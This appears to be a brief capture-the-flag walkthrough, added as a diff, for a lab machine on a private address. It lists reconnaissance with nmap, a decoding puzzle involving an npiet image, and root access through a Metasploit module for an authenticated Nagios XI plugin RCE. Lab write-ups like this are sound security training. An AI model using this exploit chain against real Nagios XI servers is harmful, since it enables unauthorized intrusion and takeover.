@@ -1,0 +1,8 @@
+1 - nmap -A 10.10.14.228
+2 - view-source:http://10.10.14.228/
+3 - chr(PERODIC NUMBER) -> / P I 3 T . P N g
+4 - npiet PI3T.PNg
+5 - http://10.10.14.228/nagiosxi/
+6 - msfconsole -> use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
+7 - cat /home/galand/user.txt
+8 - cat /root/root.txt
